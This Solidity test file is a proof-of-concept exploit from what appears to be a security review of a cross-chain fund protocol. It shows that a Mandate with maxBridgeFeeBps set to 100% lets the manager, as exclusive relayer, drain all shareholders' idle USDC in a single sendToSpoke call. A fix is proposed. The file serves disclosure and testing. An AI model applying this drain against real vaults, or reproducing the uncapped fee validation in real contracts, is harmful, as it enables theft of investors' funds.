// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IFundFactory} from "../../../src/interfaces/IFundFactory.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {IAcrossSpokePool} from "../../../src/interfaces/external/IAcrossSpokePool.sol";
import {CoreVault} from "../../../src/core/CoreVault.sol";
import {AccessFundFixture} from "./AccessFundFixture.sol";

/// @title PoC: Mandate validation caps `maxBridgeFeeBps` at 100%, so a Mandate the factory accepts authorizes a
///        one-hop drain of Free Idle through the manager's own exclusive relayer
/// @notice ATTACK. `MandateLib.validate` only requires `maxBridgeFeeBps <= 10_000` (Mandate.sol:176) and the factory
///         adds no protocol bound (QA19 leaves the VALUE open; DEC-110 says fee caps are core constants). With
///         `maxBridgeFeeBps = 10_000` the QA19 check in `CoreVaultLogic._checkSend` (CoreVaultLogic.sol:659-662)
///         accepts `outputAmount = 1` for any input, and the manager supplies the whole quote, itself as exclusive
///         relayer (FundTypes.sol:77, AcrossBridgeAdapter.sol:107-125). One `sendToSpoke` of all Free Idle for one base
///         unit of USDG: the manager fills one unit on the spoke and Across repays it the whole input.
/// @notice IMPACT. All Free Idle, in one manager transaction, with a Mandate that passes every factory check. The
///         parameter is public in the Mandate, so a shareholder who reads it is warned, which is why this is rated
///         below BridgeFeeChurn.t.sol's repeated-send path at an ordinary fee: it is the missing protocol cap
///         (DEC-110) that turns a visible number into a drain.
/// @notice FIX. A core constant cap on `maxBridgeFeeBps` in `MandateLib.validate` (a few hundred bps at most: Across's
///         measured route fee is about 0.06%, docs/DECISIONS.md), and the exclusive-relayer restriction of
///         BridgeFeeChurn.t.sol.
contract UncappedBridgeFeePoC is AccessFundFixture {
    function test_POC_mandateWithAHundredPercentBridgeFeeDrainsFreeIdleInOneSend() public {
        // Control: with the fixture's 0.5% the same quote is refused.
        uint256 snapshot = vm.snapshotState();
        (IFundFactory.FundAddresses memory honest,) = _createFund(_plan());
        CoreVault honestCore = CoreVault(honest.coreVault);
        _deposit(honestCore, alice, 600_000e6);
        vm.prank(manager);
        vm.expectPartialRevert(ICoreVault.BridgeFeeAboveMax.selector);
        honestCore.sendToSpoke(0, 598_500e6, 0, _quote(1, manager));
        vm.revertToState(snapshot);

        // The Mandate the factory accepts: every other field as in the honest fund.
        FundPlan memory plan = _plan();
        plan.maxBridgeFeeBps = 10_000;
        (IFundFactory.FundAddresses memory a,) = _createFund(plan);
        CoreVault core = CoreVault(a.coreVault);
        assertEq(core.mandate().maxBridgeFeeBps, 10_000, "public, but nothing refuses it");

        _deposit(core, alice, 600_000e6);
        _deposit(core, bob, 400_000e6);
        uint256 idle = core.idle();
        assertEq(idle, 997_500e6);

        // One send of all Free Idle for one base unit of USDG, the manager as exclusive relayer for an hour.
        address escrow = vm.computeCreateAddress(address(core), vm.getNonce(address(core)));
        vm.expectCall(
            address(hubAcross),
            abi.encodeWithSelector(
                IAcrossSpokePool.depositV3.selector,
                escrow,
                factory.addressOf(a.fundId, "SpokeVault", SPOKE),
                address(usdc),
                address(usdg),
                idle,
                uint256(1),
                SPOKE,
                manager
            )
        );
        vm.prank(manager);
        core.sendToSpoke(0, idle, 0, _quote(1, manager));
        assertEq(core.idle(), 0, "every USDC of the shareholders left the Core Vault");
        assertEq(_balance(usdc, address(hubAcross)), idle, "and waits in the Across SpokePool for the relayer");

        // Across settlement, modelled (the mock pool has no relayer leg): the exclusive relayer delivers 1 unit of
        // USDG to the Spoke Vault and is repaid the input amount in USDC.
        vm.prank(address(hubAcross));
        usdc.transfer(manager, idle);
        assertEq(_balance(usdc, manager), 997_500e6, "the manager holds the shareholders' USDC");
        assertEq(core.shareAssets(), 1, "Share Assets: the one unit of USDG that will arrive");
    }
}
